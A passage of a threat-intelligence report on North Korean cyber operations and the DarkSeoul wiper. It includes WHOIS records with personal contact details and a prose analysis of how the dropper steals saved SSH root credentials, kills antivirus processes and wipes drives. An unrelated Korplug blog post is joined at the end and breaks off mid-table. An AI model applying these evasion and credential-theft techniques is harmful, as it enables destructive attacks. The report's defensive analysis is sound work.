compromised . The upload server vector included a time - based logic bomb that allowed the wiper
to target a large number of systems , on a set time and date , with full permissions on all of the
targeted systems.383
According to CrowdStrike , the wiper malware was dropped on the systems as AgentBase.exe . The
wiper used the Windows utility ' taskkill ' to kill the processes pasvc.exe and clisvc.exe , which are
the main processes for the Ahnlab and Hauri antivirus applications.384 385 The wiper then
performed system reconnaissance , gathering drive information and operating system version .
Depending on the OS used , the wiper recursively deleted files on the file system , deleting the
Windows folder last . It then overwrote the MBR with the strings " HASTATI " , " PRINCPES " ,
" PRINCIPES " , or " PR!NCPES”.386
While there are several variants of the wiper , all seem to have been used on the same date . It is
unclear why multiple wiper variants with slightly differing behavior were used for the same
campaign . One possible explanation is that multiple variants were used to minimize the
operational damage to the mission in the case of an early detection of one of the variants . For
example , if one wiper variant was compromised or detected by antivirus or IDS signatures , the
other variants may have differed enough to remain undetected , still resulting in mission success .
According to CrowdStrike , a third malware component downloaded an IRC RAT from various
compromised websites . This RAT is detected by Symantec as Backdoor . Prioxer . Prioxer has been
linked to other 2011 attacks on South Korea . It is unclear whether these downloaders were
379
CrowdStrike Intelligence Report CSIR-13013
380
Yang , Kyle . Z:\Make Troy\ , Not War : Case Study of the Wiper APT in Korea , and Beyond . Black Hat Asia , March 2014 .
381
CrowdStrike Intelligence Report CSIR-13013
382
Yang , Kyle . Z:\Make Troy\ , Not War : Case Study of the Wiper APT in Korea , and Beyond . Black Hat Asia , March 2014 .
383
CrowdStrike Intelligence Report CSIR-13013
384
CrowdStrike Intelligence Report CSIR-13030
385
Yang , Kyle . Z:\Make Troy\ , Not War : Case Study of the Wiper APT in Korea , and Beyond . Black Hat Asia , March 2014 .
386
CrowdStrike Intelligence Report CSIR-13030
pushed out in the same update server vector as the wipers . However , the two malware types both
use the same packer ' Jokra ' and both contain the strings “ HASTATI " and " PRINCPES”.387
Analysis
Based on the information above , we have identified strategic challenges that impact the
development of North Korea ’s cyber warfare capabilities . We have also noted relevant
implications :
•     The North Korean regime strictly controls all Internet infrastructure,388 meaning cyber
activity by dissidents or autonomous hacker groups are very unlikely . In other words , any
cyber attacks originating in North Korea can be assumed to be state sponsored . For this
reason , according to defectors , the regime ’s cyber operators do not typically launch
attacks directly from within North Korea . Instead , many regime - sponsored attacks are
launched from cells based in China , U.S. , South Asia , Europe , and even South Korea.389
•     North Korea has a limited number of outgoing connections.390 For this reason , there is a
low probability of DDoS originating from within . However , this does not preclude the use
of botnets with a local C2 server or the use of networks in third - party nations to launch
attacks . As seen in the July 2009 attacks on South Korean and U.S. targets , North Korea
has leveraged networks in countries such as Austria , Georgia , Germany , and even South
Korea and the U.S. , in order to launch cyber attacks.391 North Korea will likely be forced to
rely on third parties for quite some time , due to its lack of sufficient infrastructure for
launching large - scale CNO .
•     Several outward facing websites are hosted in China and other countries . This implies two
possibilities : that North Korea ’s infrastructure can not handle a heavy incoming traffic load
392
or that the regime wants to separate the propaganda crafted for an outside target
audience from internally - focused propaganda . This arrangement seems unlikely to
change in the foreseeable future .
•     North Korea is known to have unstable power supplies393 , which limits scalability of the
regime ’s current CNO capabilities . This is another reason why expansion of CNO
capabilities using the nation ’s own infrastructure seems unlikely in the foreseeable future .
•     North Korea is known to have monetary deficiencies,394 which further limit expansion of
infrastructure and CNO capabilities , at least without third - party aid . North Korea continues
to rely heavily on China for sustainment.395
•     Although we see few instances of overt cyber operations , that North Korea reportedly
spends so much of its limited resources on training and equipping cyber operators speaks
volumes . The human element of the regime ’s cyber war program , at least , has potential .
387
CrowdStrike Intelligence Report CSIR-13013
388
http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
389
http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/5
390
http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
391
http://www.theguardian.com/world/2009/jul/11/south-korea-blames-north-korea-cyber-attacks
392
http://binarycore.org/2012/05/30/investigating-north-koreas-netblock-part-3-topology/
393
http://38north.org/2010/09/speak-loudly-and-carry-a-small-stick-the-north-korean-cyber-menace/
394
http://www.defense.gov/pubs/North_Korea_Military_Power_Report_2013-2014.pdf
395
http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
•      Sanctions against North Korea and export laws prohibit the sale of certain technologies to
the regime.396 In other words , in order to obtain the technology needed for a cyber
warfare program , the regime must improvise . North Korea must develop its own
technology , manufacture technology using plans obtained via industrial espionage , or rely
on third parties to procure it for them . However , the regime has historically failed in its
attempts of large - scale production of electronic components . At present , North Korea
relies on China to provide much of its network hardware , including servers and routers.397
It is unlikely that North Korea will compromise on its nuclear program , meaning sanctions
will likely be longstanding , and the regime will have to continue to rely on third parties to
procure technology .
Cyber incidents attributed to North Korean actors seem to follow distinct patterns :
      According to reports by other researchers , the conventions and C2 structure used by
North Korean cyber actors show continuity and consistency over time .
      The majority of the incidents attributed to North Korean actors consistently used wiper
malware .
      Several of the incidents included defacements , with a different group taking credit each
time . Additionally , little information or attack history was found about any of the groups ,
aside from information acknowledged in this report . These factors seem to indicate that a
single group may have been responsible for several attacks over time , using different
group names as a false flag .
      On more than one occasion , the malware included provisions to disable security software
made by South Korean security company AhnLab . This detail strengthens the case that
the malware was written or modified to specifically target South Korean machines .
      The attacks followed an explicit pattern : most were around the time of U.S. – South
Korean joint military exercises , while the others fell on a significant date or were in
response to political events .
      The primary targets were South Korean and U.S. entities . While these nations are
traditionally targeted by the regime , it is also possible that South Korean entities are quick
to attribute any attack on their infrastructure to North Korean actors . In fact , in some
cases , South Korean reports were the only source of attribution .
Summary
Does North Korea have sufficient cyber infrastructure and cyber warfare capabilities to harm the
U.S. and its allies ? While North Korea ’s cyber warfare capabilities pale in comparison to those of
wealthier nations , the regime has made significant progress in developing its infrastructure and in
establishing cyber operations . The rate of this progress warrants a closer look at North Korea ’s
motivations , TTPs , and capabilities . As noted above , North Korea views the U.S. and South Korea
as its primary adversaries . The U.S. and South Korea are high - tech nations with economies that
396
http://www.foxnews.com/world/2012/04/03/exclusive-cash-for-computers-is-un-busting-its-own-sanctions-in-north-korea/
397
http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
depend heavily on technology.398 In contrast , North Korea does not have a high tech culture . For
these reasons , we should not overestimate the regime ’s advanced cyber capability , yet we should
never underestimate the potential impact of North Korea utilizing less advanced , quick - and - dirty
tactics like DDoS to cripple their high - tech targets . Both government and corporate entities are
susceptible to being targeted by North Korean cyber attacks . North Korean juche ideology places
the survival of the regime as its primary goal , and any perceived threat to the regime may be
targeted . Several attacks on U.S. and South Korean government , financial , and critical
infrastructure entities have been attributed to North Korean origins .. These attacks were often
preceded by or occurred in conjunction with North Korea voicing negative sentiments about the
targeted entities . As we saw with Iranian cyber actors in HPSR Security Briefing Episode 11,399
state sponsored cyber actors often launch an attack in response to a political trigger . The same
pattern seems to apply to pro - North Korean cyber actors , who have launched attacks to coincide
with U.S. Independence Day and the anniversary of the start of the Korean War , as well as
propaganda and cyber attacks in response to joint military exercises between the U.S. and South
Korea.400 401
As shown by North Korea 's past behavior ( which is consistent with their doctrine ) , they are easily
" pushed into a corner " . At the slightest perceived threat , the regime responds with saber - rattling
and peacocking . The regime is extremely defensive and will , in turn , flex its muscles to show the
world how capable it is , even if this is an inaccurate display of their overall capabilities .
The regime fears losing its control and the nation ’s culture to the ever - growing threat of outside
influence , as is evidenced in the regime ’s reaction to the comedy film “ The Interview ” . The regime
has represented itself to its citizens as a powerful and capable entity and has used this status to
control the populace . For this reason , the regime ’s leaders are forced to continually demonstrate
this strength and power , or an illusion thereof , both domestically and globally , in order to
maintain the status needed to ensure continued suppression of the population . This show of
power may require that the regime takes chances and stretches beyond its abilities at times , but
in the spirit of juche and songun , the regime will continue this façade , fearful of losing the image
its leaders have worked so hard to maintain .
HP Security Research recommendations
North Korean cyber operations are not generally observed originating from home field IP address
space , so geo - IP based blocking of traffic originating from those net - blocks is ineffective .
398
http://www.apcss.org/Publications/Edited%20Volumes/BytesAndBullets/CH2.pdf
399
http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/HPSR-Threat-Intelligence-Briefing-Episode-11/ba-p/6385243#.U5HkbpRdV90
400
http://www.zdnet.com/south-korea-braces-for-norths-cyberattacks-7000012587/
401
http://www.symantec.com/connect/blogs/four-years-darkseoul-cyberattacks-against-south-korea-continue-anniversary-korean-war
Given that North Korea has capable and technically trained forces and will demonstrate their
power when they feel provoked , western entities should consciously avoid promoting ideas or
doctrine that is blatantly slanderous to the regime . Encouraging such ideas could cause those
entities to become a focal point for North Korean cyber attacks .
Due to the fact that North Korean infrastructure is aging and its resources are not able to keep up
with the rest of the world , entities with interesting R&D or IP ( intellectual property ) - especially
military in nature – could become targets of interest for North Korea . Interest in defense - related
IP and R&D could also stem from North Korea ’s relationship with China . In the Chinese business
culture , taking another entity ’s IP or R&D is not stealing – it is accepted as business as usual . It is
possible that North Korea , if under Chinese influence , would adopt the same attitude , given the
regime ’s limited capacity for homegrown innovation .
Known DPRK targets have been limited primarily to South Korean and U.S. organizations and
government entities . For these targets , prudent measures should include :
    Following traditional defense in depth approaches and security best practices
    Monitoring for malware that disables Korean language antivirus software , such as
that from AhnLab
    To protect against the attack vectors used in North Korean malware campaigns ,
an advisable prevention tactic is to focus on hardening update / patch
management systems . These systems are appealing targets due to the potential
for a large impact
Appendix A – WHOIS records
WHOIS record for silibank.net :
Domain Name : silibank.net
Registry Domain ID :
Registrar WHOIS Server : whois.discount-domain.com
Registrar URL : http://www.onamae.com
Updated Date : 2014 - 03 - 11 17:27:55.0
Creation Date : 2006 - 03 - 13 13:14:53.0
Registrar Registration Expiration Date : 2015 - 03 - 13 03:14:53.0
Registrar : GMO INTERNET , INC .
Registrar IANA ID : 49
Registrar Abuse Contact Email : abuse@gmo.jp
Registrar Abuse Contact Phone :
Domain Status : ACTIVE
Registry Registrant ID :
Registrant Name : Whois Privacy Protection Service by MuuMuuDomain
Registrant Organization : Whois Privacy Protection Service by MuuMuuDomain
Registrant Street1 : 2 - 7 - 21 Tenjin Chuo - ku
Registrant Street2 : Tenjin Prime 8F
Registrant City : Fukuoka - shi
Registrant State / Province : Fukuoka
Registrant Postal Code : 810 - 0001
Registrant Country : JP
Registrant Phone : 81 - 927137999
Registrant Phone Ext :
Registrant Fax : 81 - 927137944
Registrant Fax Ext :
Registrant Email : privacy@whoisprivacyprotection.info
Registry Admin ID :
Admin Name : Whois Privacy Protection Service by MuuMuuDomain
Admin Organization : Whois Privacy Protection Service by MuuMuuDomain
Admin Street1 : 2 - 7 - 21 Tenjin Chuo - ku
Admin Street2 : Tenjin Prime 8F
Admin City : Fukuoka - shi
Admin State / Province : Fukuoka
Admin Postal Code : 810 - 0001
Admin Country : JP
Admin Phone : 81 - 927137999
Admin Phone Ext :
Admin Fax : 81 - 927137944
Admin Fax Ext :
Admin Email : privacy@whoisprivacyprotection.info
Registry Tech ID :
Tech Name : Whois Privacy Protection Service by MuuMuuDomain
Tech Organization : Whois Privacy Protection Service by MuuMuuDomain
Tech Street1 : 2 - 7 - 21 Tenjin Chuo - ku
Tech Street2 : Tenjin Prime 8F
Tech City : Fukuoka - shi
Tech State / Province : Fukuoka
Tech Postal Code : 810 - 0001
Tech Country : JP
Tech Phone : 81 - 927137999
Tech Phone Ext :
Tech Fax : 81 - 927137944
Tech Fax Ext :
Tech Email : privacy@whoisprivacyprotection.info
Name Server : ns1.dns.ne.jp
Name Server : ns2.dns.ne.jp
WHOIS Record for kcna.kp :
inetnum :        175.45.176.0 - 175.45.179.255
netname : STAR - KP
descr : Ryugyong - dong
descr : Potong - gang District
country : KP
admin - c : SJVC1-AP
tech - c : SJVC1-AP
status : ALLOCATED PORTABLE
mnt - by : APNIC - HM
mnt - lower : MAINT - STAR - KP
mnt - routes : MAINT - STAR - KP
remarks : -+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+
remarks : This object can only be updated by APNIC hostmasters .
remarks : To update this object , please contact APNIC
remarks : hostmasters and include your organisation 's account
remarks : name in the subject line .
remarks : -+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+
mnt - irt : IRT - STAR - KP
changed : hm-changed@apnic.net 20091221
source : APNIC
irt : IRT - STAR - KP
address : Ryugyong - dong Potong - gang District
e - mail : sahayod@loxley.co.th
abuse - mailbox : sahayod@loxley.co.th
admin - c : SJVC1-AP
tech - c : SJVC1-AP
auth : # Filtered
mnt - by : MAINT - STAR - KP
changed : sahayod@loxley.co.th 20120202
source : APNIC
role : STAR JOINT VENTURE CO LTD - network administrat
address : Ryugyong - dong Potong - gang District
country : KP
phone : + 66 81 208 7602
fax - no : + 66 2 240 3180
e - mail : sahayod@loxley.co.th
admin - c : SJVC1-AP
tech - c : SJVC1-AP
nic - hdl : SJVC1-AP
mnt - by : MAINT - STAR - KP
changed : hm-changed@apnic.net 20091214
source : APNIC
WHOIS Record for rodong.rep.kp :
inetnum :      175.45.176.0 - 175.45.179.255
netname :       STAR - KP
descr :      Ryugyong - dong
descr :      Potong - gang District
country :      KP
admin - c :      SJVC1-AP
tech - c :      SJVC1-AP
status :      ALLOCATED PORTABLE
mnt - by :       APNIC - HM
mnt - lower : MAINT - STAR - KP
mnt - routes : MAINT - STAR - KP
remarks :      -+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+
remarks :      This object can only be updated by APNIC hostmasters .
remarks :      To update this object , please contact APNIC
remarks :      hostmasters and include your organisation 's account
remarks :      name in the subject line .
remarks :      -+-+-+-+-+-+-+-+-+-+-+-++-+-+-+-+-+-+-+-+-+-+-+-+-+-+
mnt - irt :     IRT - STAR - KP
changed :       hm-changed@apnic.net 20091221
source :      APNIC
irt :      IRT - STAR - KP
address :      Ryugyong - dong Potong - gang District
e - mail :      sahayod@loxley.co.th
abuse - mailbox : sahayod@loxley.co.th
admin - c :      SJVC1-AP
tech - c :      SJVC1-AP
auth :       # Filtered
mnt - by :       MAINT - STAR - KP
changed :       sahayod@loxley.co.th 20120202
source :      APNIC
role :       STAR JOINT VENTURE CO LTD - network administrat
address :      Ryugyong - dong Potong - gang District
country :      KP
phone :       + 66 81 208 7602
fax - no :      + 66 2 240 3180
e - mail :      sahayod@loxley.co.th
admin - c :      SJVC1-AP
tech - c :      SJVC1-AP
nic - hdl :     SJVC1-AP
mnt - by :       MAINT - STAR - KP
changed :       hm-changed@apnic.net 20091214
source :      APNIC
WHOIS Record for uriminzokkiri.com :
Domain Name : uriminzokkiri.com
PunnyCode : uriminzokkiri.com
Creation Date : 2003 - 02 - 09 00:00:00
Updated Date : 2012 - 06 - 28 13:22:18
Expiration Date : 2015 - 02 - 09 00:00:00
Registrant :
Organization : chaoxianLiuYiYuBianJishe ShenYang Ban SHICHU
Name : Korea 615 Shenyang company
Address : shenyang hepingqu xifudalu 168 hao 2 danyuan 2 - 12 - 1
City : shenyangshi
Province / State : liaoningsheng
Country : china
Postal Code : 123456
Administrative Contact :
Name : kim sejun
Organization : Shenyang xin neng yuang
Address : shenyang hepingqu xifudalu 168 hao 2 danyuan 2 - 12 - 1
City : shenyangshi
Province / State : liaoningsheng
Country : china
Postal Code : 123456
Phone Number :
Fax : 86 - 024 - 22523102
Email : hyk1979@hotmail.com
Technical Contact : Name : kim sejun
￼Organization : Shenyang xin neng yuang
Address : shenyang hepingqu xifudalu 168 hao 2 danyuan 2 - 12 - 1
City : shenyangshi
Province / State : liaoningsheng
Country : china
Postal Code : 123456
Phone Number :
Fax : 86 - 024 - 22523102
Email : hyk1979@hotmail.com
Billing Contact :
Name : kim sejun
Organization : Shenyang xin neng yuang
Address : shenyang hepingqu xifudalu 168 hao 2 danyuan 2 - 12 - 1
City : shenyangshi
Province / State : liaoningsheng
Country : china
Postal Code : 123456
Phone Number :
Fax : 86 - 024 - 22523102
Email : hyk1979@hotmail.com
WHOIS Record for ournation-school.com :
Domain Name : ournation-school.com
Registry Domain ID :
Registrar WHOIS Server : whois.paycenter.com.cn
Registrar URL : http://www.xinnet.com
Updated Date:2012 - 06 - 28 13:22:20
Creation Date:2004 - 10 - 29 00:00:00
Registrar Registration Expiration Date:2014 - 10 - 29 00:00:00
Registrar : XINNET TECHNOLOGY CORPORATION
Registrar IANA ID:120
Registrar Abuse Contact Email : supervision@xinnet.com
Registrar Abuse Contact Phone:+86.1087128064
Domain Status :
Registry Registrant ID :
Registrant Name : Korea 615 Shenyang company
Registrant Organization : chaoxian liuyiyubianjishe shenyangbanshichu
Registrant Street : shenyang hepingqu xifudalu 168 hao 2 danyuan 2 - 12 - 1
Registrant City : shenyangshi
Registrant State / Province : liaoningsheng
Registrant Postal Code:123456
Registrant Country : China
Registrant Phone:+86.024 22523102
Registrant Phone Ext :
Registrant Fax:+86.024 22523102
Registrant Fax Ext :
Registrant Email:urimanager@silibank.com
Registry Admin ID :
Admin Name : Korea 615 Shenyang company
Admin Organization : Korea 615 Shenyang company
Admin Street : shenyang hepingqu xifudalu 615 hao 2 danyuan 6 - 1 - 5
Admin City : shenyangshi
Admin State / Province : liaoningsheng
Admin PostalCode:123456
Admin Country : China
Admin Phone:+86.024 22523102
Admin Phone Ext :
Admin Fax:+86.024 22523102
Admin Fax Ext :
Admin Email:urimanager@silibank.com
Registry Tech ID :
Tech Name : Korea 615 Shenyang company
Tech Organization : Korea 615 Shenyang company
Tech Street : shenyang hepingqu xifudalu 615 hao 2 danyuan 6 - 1 - 5
Tech City : shenyangshi
Tech State / Province : liaoningsheng
Tech PostalCode:123456
Tech Country : China
Tech Phone:+86.024 22523102
Tech Phone Ext :
Tech Fax:+86.024 22523102
Tech Fax Ext :
Tech Email:urimanager@silibank.com
Name Server : ns13.xincache.com
Name Server : ns14.xincache.com
DNSSEC : unsigned
WHOIS Record for chongryon.com :
Domain Name : chongryon.com
Registry Domain ID : 69711868_DOMAIN_COM - VRSN
Registrar WHOIS Server : whois.melbourneit.com
Registrar URL : http://www.melbourneit.com.au
Updated Date : 2014 - 03 - 26T00:31:24Z
Creation Date : 2001 - 04 - 20T06:45:46Z
Registrar Registration Expiration Date : 2015 - 04 - 20T06:45:46Z
Registrar : Melbourne IT Ltd
Registrar IANA ID : 13
Registrar Abuse Contact Email : abuse@melbourneit.com.au
Registrar Abuse Contact Phone : + 61.386242300
Domain Status : ok
Registry Registrant ID :
Registrant Name : o guanin
Registrant Organization : o guanin
Registrant Street : " hujimi2 - 14 - 15 , "
Registrant City : chiyodaku
Registrant State / Province : tokyo
Registrant Postal Code : 1028138
Registrant Country : JP
Registrant Phone : + 81.332627111
Registrant Phone Ext :
Registrant Fax :
Registrant Fax Ext :
Registrant Email : park2@mac.com
Registry Admin ID :
Admin Name : guanin o
Admin Organization :
Admin Street : " hujimi2 - 14 - 15 , "
Admin City : chiyodaku
Admin State / Province : tokyo
Admin Postal Code : 1028138
Admin Country : JP
Admin Phone : + 81.332627111
Admin Phone Ext :
Admin Fax :
Admin Fax Ext :
Admin Email : park2@mac.com
Registry Tech ID :
Tech Name : Link Club
Tech Organization : Link Club
Tech Street : 5 - 39 - 6 Jingumae Shibuya - ku
Tech City : TOKYO
Tech State / Province : 150 - 0001
Tech Postal Code : JP
Tech Country : JP
Tech Phone : + 81.462643403
Tech Phone Ext :
Tech Fax :
Tech Fax Ext :
Tech Email : mel-tech@hosting-link.ne.jp
Name Server : USR - NS1.LINKCLUB.JP
Name Server : USR - NS2.LINKCLUB.JP
DNSSEC : unsigned
URL of the ICANN WHOIS Data Problem Reporting System : http://wdrprs.internic.net
> > > Last update of WHOIS database : 2014 - 05 - 13T18:15:18Z
WHOIS Record for korea-np.co.jp :
Domain Information : [ B%I%a%$%s > pJs ]
a. [ B%I%a%$%sL > ]             KOREA - NP.CO.JP
e. [ B$=$7$-$a$$ ]           B$+$V$7$-$,$$$7$c B$A$g$&$;$s$7$s$]$&$7$c
f. [ BAH?%L > ]            B3t<02q < R BD+A/?7Js < R
g. [ Organization ]        The Choson Shinbo Company Inc.
k. [ BAH?%<oJL ]            B3t<02q < R
l. [ Organization Type ]     CO
m. [ BEPO?C4Ev < T ]            YK18923JP
n. [ B5;=QO"MmC4Ev < T ]          YK18923JP
p. [ B%M!<%`%5!<%P ]            uns01.usen.ad.jp
p. [ B%M!<%`%5!<%P ]            uns02.usen.ad.jp
s. [ B = pL>80 ]
[ B > uBV ]               Connected ( 2015/02/28 )
[ BEPO?G/7nF| ]            1997/02/14
[ B@\B3G/7nF| ]             1997/06/03
[ B : G=*99?7 ]             2014/03/01 01:16:34 ( JST )
Appendix B – Sites found on North Korean IP space
smtp.star-co.net.kp     175.45.176.10    airkoryo.com.kp         175.45.176.69
smtp.start-di.net.kp    175.45.176.10    spwebh2.star.net.kp     175.45.176.7
spinef1.star.net.kp     175.45.176.10    mail.silibank.net.kp    175.45.176.70
spinef2.star.net.kp     175.45.176.11    kcna.kp                 175.45.176.71
ns1.co.kp               175.45.176.15    gnu.rep.kp              175.45.176.73
ns1.com.kp              175.45.176.15    vok.rep.kp              175.45.176.75
ns1.edu.kp              175.45.176.15    friend.com.kp           175.45.176.8
ns1.gov.kp              175.45.176.15    korelcfund.org.kp       175.45.176.8
ns1.kptc.kp             175.45.176.15    ns1.cooks.org.kp        175.45.176.8
ns1.kptc.kp             175.45.176.15    ns1.friend.com.kp       175.45.176.8
ns1.net.kp              175.45.176.15    ns1.gnu.rep.kp          175.45.176.8
ns1.org.kp              175.45.176.15    ns1.kcna.kp             175.45.176.8
ns1.org.kp              175.45.176.15    ns1.koredfund.org.kp 175.45.176.8
ns1.rep.kp              175.45.176.15    ns1.korelcfund.org.kp 175.45.176.8
ns2.co.kp               175.45.176.16    ns1.korfilm.com.kp      175.45.176.8
ns2.com.kp              175.45.176.16    ns1.ksf.com.kp          175.45.176.8
ns2.edu.kp              175.45.176.16    ns1.naenara.com.kp      175.45.176.8
ns2.gov.kp              175.45.176.16    ns1.rodong.rep.kp       175.45.176.8
ns2.kptc.kp             175.45.176.16    ns1.silibank.net.kp     175.45.176.8
ns2.kptc.kp             175.45.176.16    ns1.star-co.net.kp      175.45.176.8
ns2.net.kp              175.45.176.16    ns1.star-di.net.kp      175.45.176.8
ns2.org.kp              175.45.176.16    ns1.star.net.kp         175.45.176.8
ns2.rep.kp              175.45.176.16    ns1.vok.rep.kp          175.45.176.8
friend.com.kp           175.45.176.39    ns2.airkoryo.com.kp     175.45.176.8
friend.com.kp           175.45.176.67    friend.com.kp           175.45.176.9
gnu.rep.kp              175.45.176.67    gnu.rep.kp              175.45.176.9
koredfund.org.kp        175.45.176.67    koredfund.org.kp        175.45.176.9
korelcfund.org.kp       175.45.176.67    korelcfund.org.kp       175.45.176.9
ksf.com.kp              175.45.176.67    ns2.airkoryo.com.kp     175.45.176.9
naenara.com.kp          175.45.176.67    ns2.cooks.org.kp        175.45.176.9
vok.rep.kp              175.45.176.67    ns2.friend.com.kp       175.45.176.9
rodong.rep.kp           175.45.176.68    ns2.gnu.rep.kp          175.45.176.9
ns2.kcna.kp            175.45.176.9     friend.com.kp        175.45.177.77
ns2.koredfund.org.kp 175.45.176.9      koredfund.org.kp     175.45.177.77
ns2.korelcfund.org.kp 175.45.176.9     korelcfund.org.kp    175.45.177.77
ns2.korfilm.com.kp     175.45.176.9     naenara.com.kp       175.45.177.77
ns2.ksf.com.kp         175.45.176.9     vok.rep.kp           175.45.177.77
ns2.naenara.com.kp     175.45.176.9     mail.chosunexpo.com 175.45.178.101
ns2.rodong.rep.kp      175.45.176.9     ns3.kptc.kp          175.45.178.173
ns2.silibank.rep.kp    175.45.176.9     ns3.kptc.kp          175.45.178.173
ns2.star-co.net.kp     175.45.176.9     ns1.knic.com.kp      175.45.178.8
ns2.star-di.net.kp     175.45.176.9     ns1.knic.com.kp      175.45.178.8
ns2.star.net.kp        175.45.176.9     ns1.star.edu.kp      175.45.179.66
ns2.vok.rep.kp         175.45.176.9     ns1.star.edu.kp      175.45.179.66
vok.rep.kp             175.45.176.9     email.kp.col.cn      175.45.179.67
gnu.rep.kp             175.45.177.73    mail.star.edu.kp     175.45.179.69
vok.rep.kp             175.45.177.75
Appendix C – Analysis of DarkSeoul Dropper
Dropper
MD5 : 9263e40d9823aecf9388b64de34eae54
Also known as / detected as :
 Dropper - FDH ( McAfee )
 Trojan : Win32/Dembr . A ( Microsoft )
 Trojan . Jokra ( Symantec )
The dropper component that we examined was distributed as a UPX - packed binary .
Installation
When executed it creates the following files in the affected user ’s % Temp% directory :
•    alg.exe : A legitimate binary used to open SSH connections with remote servers
MD5 e45cd9052dd3dd502685dfd9aa2575ca
Size : 166,912 bytes
•    conime.exe : A legitimate binary used to open SSH connections with remote servers
MD5 : 6a702342e8d9911bde134129542a045b
Size : 153,600 bytes
•    ~pr1.tmp : Payload - A destructive bash script
MD5 : dc789dee20087c5e1552804492b042cd
Size : 1,186 bytes
Also known as / detected as :
KillMBR - FBIA ( McAfee )
Trojan : SH / Kofornix . A ( Microsoft )
Trojan . Jokra ( Symantec )
•    AgentBase.exe : Payload - Win32 wiper component ( see details below )
MD5 : db4bbdc36a78a8807ad9b15a562515c4
Size : 24,576
Payload — attempts to connect to remote servers and upload a destructive bash script
After determining the location of user profile directories on the affected computer , the malware
searches these directories for configuration files and directories that may be associated with the
connection manager clients mRemote and SecureCRT .
• mRemote — an open source tool for centrally managing remote server connections using a GUI
( Kevin Kline , 2008).69 This tool is no longer being actively developed or supported .
• SecureCRT — a commercial SSH and Telnet client by VanDyke Software .
If an mRemote installation is located , the dropper reads the configuration file and checks if there ’s
a NODE that is defined with “ Username = root ” , “ Protocol = SSH ” , and a password that is not blank . If
those conditions are satisfied it extracts the information . The password is decrypted after being
extracted .
If a SecureCRT installation is located , the dropper extracts information from sessions that have
Username = root , Protocol = SSH and a saved password . If these conditions are satisfied , the
username , hostname , port , and password are extracted . The password is then decrypted .
After extracting these connection and server details , the dropper uses the previously dropped alg .
exe and conime.exe to attempt to connect remote servers , upload and run the bash script
~pr1.tmp .
The bash script initially checks which UNIX it is running on ( of HP - UX , SunOS , Linux , or AIX ) and
then attempts to wipe the /kernel , /usr /etc and /home directories , thus rendering the machine
inoperative .
Win32 Wiper component
When the AgentBase.exe component is executed , it first attempts to stop the following processes ,
presumably in order to evade detection :
• pasvc.exe – policy agent from AhnLab
• clisvc.exe – ViRobot ISMS from Hauri
It then enumerates all physical drives and overwrites the first 512 bytes with the string :
“ princpes ” , effectively destroying the MBR ( master boot record ) of the affected drive .
It continues to look for removable and fixed drives , locates the root directory on these drives , and
then attempts to delete all files and folders in this directory .
Finally , the affected computer is shut down and rebooted , although if the wiping mechanisms
were successful then the machine will not be able to boot .
Learn more at
hp.com/go/hpsr

Korplug military targeted attacks : Afghanistan & Tajikistan
After taking a look at recent Korplug ( PlugX ) detections , we identified two larger scale campaigns
employing this well - known Remote Access Trojan . This blog gives an overview of the first one , related to
Afghanistan & Tajikistan . The other campaign , where the targets were a number of high - profile
organizations in Russia , will be the subject of Anton Cherepanov ’s presentation at the ZeroNights
security conference in Moscow this week .
Sometimes malware used in various attacks is unique enough to identify related incidents , which makes
tracking individual botnets simpler . An example is the BlackEnergy Lite variant ( also known as
BlackEnergy 3 ) used by a group of attackers ( that was then given the name Quedagh , or Sandworm )
against targets in Ukraine and other countries . BlackEnergy Lite is clearly distinguishable from the
numerous binaries of the more common BlackEnergy 2 also circulating in - the - wild .
In other cases , attackers use more common tools for accomplishing their criminal goals . For example , the
Korplug RAT ( a.k.a .PlugX ) is a well - known toolkit associated with Chinese APT groups and used in a
large number of targeted attacks since 2012 . For the past several weeks we have taken a closer look at a
great number of detections of this malware in many unrelated incidents .
Among these , we were able to discover several successful infections where the employed Korplug samples
were connecting to the same C&C domain .
DOMAIN : www.notebookhk.net
Updated Date : 2013 - 11 - 12 18:03:45
Create Date : 2013 - 06 - 18 11:08:17
Registrant Name : lee stan
Registrant Organization : lee stan
Registrant Street : xianggangdiqu
Registrant City : xianggangdiqu
Registrant State : xianggang
Registrant Postal Code : 796373
Registrant Country : HK
Registrant Phone : + 0.04375094543
Registrant Fax : + 0.04375094543
Registrant Email:stanlee@gmail.com
Other Korplug samples were connecting to a different domain name resolving to the same IPs as
notebookhk.net :
DOMAIN : www.dicemention.com
Updated Date : 2013 - 11 - 12 18:05:33
Create Date : 2013 - 09 - 10 14:35:11
Registrant Name : z x
Registrant Organization : z x
Registrant Street : xianggangdiqu
Registrant City : xianggangdiqu
Registrant State : xianggang
Registrant Postal Code : 123456
Registrant Country : HK
Registrant Phone : + 0.0126324313
Registrant Fax : + 0.0126324313
Registrant Email : 123@123.com
DOMAIN : www.abudlrasul.com
Updated Date : 2014 - 10 - 16 14:16:27
Create Date : 2014 - 10 - 16 14:16:27
Registrant Name : gang xin
Registrant Organization : gang xin
Registrant Street : Argentina Argentina
Registrant City : Argentina
Registrant State : Argentina
Registrant Postal Code : 647902
Registrant Country : AR
Registrant Phone : + 54.0899567089
Registrant Fax : + 54.0899567089
Registrant Email : woffg89@yahoo.com
Taking these C&Cs as a starting point , we were able to locate a number of victims infected through various
exploit - laden spear - phishing documents and cunningly - named archives .
A table with a selection of RTF documents and RAR self - extracting archives with a .SCR extension is
shown below :
English
File name                                                         SHA1
translation
Situation Report about
36119221826D0290BC23371B55A8C0E6A84718DD
Afghan.doc
AGREEMENT BETWEENTHE
NATO AND AFGHANISTAN
ON THE STATUS OF NATO                                    A6642BC9F3425F0AB93D462002456BE231BB5646
FORCES IN
AFGHANISTAN.doc
